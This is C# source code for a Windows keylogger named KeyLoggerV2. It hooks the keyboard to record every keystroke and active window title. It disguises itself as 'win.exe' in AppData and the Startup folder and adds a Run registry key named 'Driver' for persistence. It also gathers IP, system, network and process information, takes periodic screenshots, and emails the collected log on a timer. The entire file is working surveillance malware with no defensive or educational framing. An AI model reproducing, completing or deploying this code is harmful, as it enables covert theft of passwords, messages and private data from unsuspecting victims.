using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace KeyLoggerV2
{
    static class Program
    {
        private static TextBox textBody = new TextBox();

        #region Folder Path

        //Folders
        //Find the path of the running application
        private static string folderSource = Application.ExecutablePath;

        //Folder to copy the exe application
        private static string folderDestination = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        //Startup folder 
        private static string folderStartUpDestination = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

        #endregion
        //jhh
        //Active window
        private static string activeWindow = "";


        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static byte shift = 0;
        private static byte capsLock = 0;
        private static IntPtr hookId = IntPtr.Zero;
        private static LowLevelKeyboardProc proc = GetKeyStroke;

        #region DLL for keystrokes
        //Keystrokes
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        #endregion

        #region DLL for active region
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        #endregion

        static void Main()
        {
            #region Settings for browsers

            if (Properties.Settings.Default.browser == 0 || Properties.Settings.Default.browser == 1 | Properties.Settings.Default.browser == 2)
            {
                Properties.Settings.Default.browser++;
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();
            }else if (Properties.Settings.Default.browser == 3)
            {
                Browser bro = new Browser();
                bro.DeleteBrowser();

                Properties.Settings.Default.browser++;
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();
            }
            #endregion

            StartUp();

            hookId = SetHook(proc);
            //Timers
            #region SetTimers

            System.Timers.Timer timerActiveWindow = new System.Timers.Timer();
            timerActiveWindow.Elapsed += (ActiveWindow);
            timerActiveWindow.AutoReset = true;
            timerActiveWindow.Interval = 100;

            System.Timers.Timer timerSendEmail = new System.Timers.Timer();
            SendEmail email = new SendEmail();
            timerSendEmail.Elapsed += (source, e) => email.Send(source, e, textBody.Text);
            timerSendEmail.AutoReset = true;
            timerSendEmail.Interval = 18000000;
            timerSendEmail.Start();

            System.Timers.Timer timerSendScreen = new System.Timers.Timer();
            ImageCapture img = new ImageCapture();
            timerSendScreen.Elapsed += (source, e) => img.Save(source, e, Properties.Settings.Default.counter);
            timerSendScreen.AutoReset = true;
            timerSendScreen.Interval = 13000;
            timerSendScreen.Start();

            #endregion

            #region GetInformation

            textBody.Text += DateTime.Now + "<br><font color=blue>";
            textBody.Text += "<br><h1>Nationality Information</h1><br>";

            //Get the Ip
            IpAddress ip = new IpAddress();
            string ipAddress = ip.GetIpAddress();
            textBody.Text += "<br> IP: " + ipAddress + "<br></font>";

            //Get the Operating System information
            textBody.Text += "<font color=red><br> Operating Languange: " + CultureInfo.CurrentCulture.Name;

            textBody.Text += "<br><h1> System Information</h1><br>";

            OperatingSystem os = new OperatingSystem();
            textBody.Text += os.GetOsInformation() + "</font>";

            //GET Networking information
            textBody.Text += "<font color=Green><br><h1>Networking Information</h1><br>";
            NetworkInfo nt = new NetworkInfo();
            textBody.Text += nt.GetNtInformation() + "</font>";

            //GET Processes information
            textBody.Text += "<br><h1>Running Processes</h1><br>";
            RunningPro procces = new RunningPro();
            textBody.Text += procces.GetProc();

            #endregion

            timerActiveWindow.Start();
            Application.Run();
            GC.KeepAlive(timerActiveWindow);
            GC.KeepAlive(timerSendEmail);
            GC.KeepAlive(timerSendScreen);

            UnhookWindowsHookEx(hookId);

        }

        private static void ActiveWindow(object obj, EventArgs e)
        {
            IntPtr hwnd = GetForegroundWindow();

            const int CAPACITY = 512;
            var text = new StringBuilder(CAPACITY);
            try
            {
                if (GetWindowText(hwnd, text, CAPACITY) > 0)
                {
                    if (activeWindow != text.ToString())
                    {
                        textBody.Text += "<br><font color=purple>[" + text + "]</font><br><br>";
                        activeWindow = text.ToString();

                    }
                }
            }
            catch (Exception)
            {

                throw;
            }
        }

        private static void StartUp()
        {
            //Create directory to put the virus
            Directory.CreateDirectory(folderDestination + @"\Windows\");

            //Path for the folder we created
            folderDestination = Path.Combine(folderDestination + @"\Windows\", "win.exe");

            try
            {
                if (File.Exists(folderDestination) == false)
                {
                    File.Copy(folderSource, folderDestination, false);
                }
            }
            catch (Exception)
            {

                throw;
            }
            //Path for the startup folder we created
            folderStartUpDestination = Path.Combine(folderStartUpDestination, "win.exe");
            try
            {
                if (File.Exists(folderStartUpDestination) == false)
                {
                    File.Copy(folderSource, folderStartUpDestination, false);
                }
            }
            catch (Exception)
            {

                throw;
            }
            //Create registry key of it does not exist
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

                if (key.GetValue("Driver") == null)
                {
                    key.SetValue("Driver", "\"" + folderDestination + "\"" + @" /autostart");

                    key.Close();
                }
            }
            catch (Exception)
            {
                
                throw;
            }

           



        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process p = Process.GetCurrentProcess())
            {
                using (ProcessModule m = p.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(m.ModuleName), 0);
                }
            }
        }

        private static IntPtr GetKeyStroke(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int code = Marshal.ReadInt32(lParam);
                if (Keys.Shift == Control.ModifierKeys)
                {
                    shift = 1;
                    switch ((Keys)code)
                    {
                        case Keys.Space:
                            textBody.Text += " ";
                            break;
                        case Keys.Return:
                            textBody.Text += Environment.NewLine;
                            break;
                        case Keys.Back:
                            textBody.Text += "(BACKSPACE)";
                            break;
                        case Keys.Delete:
                            textBody.Text += "(DELETE)";
                            break;
                        case Keys.PageUp:
                            textBody.Text += "(PAGE UP)";
                            break;
                        case Keys.PageDown:
                            textBody.Text += "(PAGE DOWN)";
                            break;
                        case Keys.Home:
                            textBody.Text += "(HOME)";
                            break;
                        case Keys.End:
                            textBody.Text += "(END)";
                            break;
                        case Keys.Up:
                            textBody.Text += "(UP ARROW)";
                            break;
                        case Keys.Down:
                            textBody.Text += "(DOWN ARROW)";
                            break;
                        case Keys.Left:
                            textBody.Text += "(LEFT ARROW)";
                            break;
                        case Keys.Right:
                            textBody.Text += "(RIGHT ARROW)";
                            break;
                        case Keys.Tab:
                            textBody.Text += "(TAB)";
                            break;
                        case Keys.CapsLock:
                            textBody.Text += "(CAPSLOCK)";
                            break;
                        case Keys.LShiftKey:
                            textBody.Text += "(LEFT SHIFT)";
                            break;
                        case Keys.RShiftKey:
                            textBody.Text += "(RIGHT SHIFT)";
                            break;
                        case Keys.LControlKey:
                            textBody.Text += "(LEFT CTRL)";
                            break;
                        case Keys.RControlKey:
                            textBody.Text += "(RIGHT CTRL)";
                            break;
                        case Keys.Alt:
                            textBody.Text += "(ALT)";
                            break;
                        case Keys.LMenu:
                            textBody.Text += "(LEFT MENU)";
                            break;
                        case Keys.RMenu:
                            textBody.Text += "(RIGHT MENU)";
                            break;
                        case Keys.LWin:
                            textBody.Text += "(LEFT WINDOW)";
                            break;
                        case Keys.RWin:
                            textBody.Text += "(RIGHT WINDOW)";
                            break;
                        case Keys.Apps:
                            textBody.Text += "(APPS)";
                            break;
                        case Keys.VolumeUp:
                            textBody.Text += "(VOLUME UP)";
                            break;
                        case Keys.VolumeDown:
                            textBody.Text += "(VOLUME DOWN)";
                            break;
                        case Keys.VolumeMute:
                            textBody.Text += "(VOLUME MUTE)";
                            break;
                        case Keys.D0:
                            if (Program.shift == 0) textBody.Text += "0";                           
                            else textBody.Text += ")"; 
                            break;
                        case Keys.D1:
                            if (Program.shift == 0) textBody.Text += "1";
                            else textBody.Text += "!";
                            break;
                        case Keys.D2:
                            if (Program.shift == 0) textBody.Text += "2";
                            else textBody.Text += "";
                            break;
                        case Keys.D3:
                            if (Program.shift == 0) textBody.Text += "3";
                            else textBody.Text += "#";
                            break;
                        case Keys.D4:
                            if (Program.shift == 0) textBody.Text += "4";
                            else textBody.Text += "¤";
                            break;
                        case Keys.D5:
                            if (Program.shift == 0) textBody.Text += "5";
                            else textBody.Text += "%";
                            break;
                        case Keys.D6:
                            if (Program.shift == 0) textBody.Text += "6";
                            else textBody.Text += "&";
                            break;
                        case Keys.D7:
                            if (Program.shift == 0) textBody.Text += "7";
                            else textBody.Text += "/";
                            break;
                        case Keys.D8:
                            if (Program.shift == 0) textBody.Text += "8";
                            else textBody.Text += "(";
                            break;
                        case Keys.D9:
                            if (Program.shift == 0) textBody.Text += "9";
                            else textBody.Text += ")";
                            break;
                        default:
                            if (shift == 0 && capsLock == 0) textBody.Text += ((Keys) code).ToString().ToLower();
                            if (shift == 1 && capsLock == 0) textBody.Text += ((Keys)code).ToString().ToUpper();
                            if (shift == 0 && capsLock == 1) textBody.Text += ((Keys)code).ToString().ToUpper();
                            if (shift == 1 && capsLock == 1) textBody.Text += ((Keys)code).ToString().ToLower();
                            break;
                    }
                    shift = 0;
                }
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }
    }
}
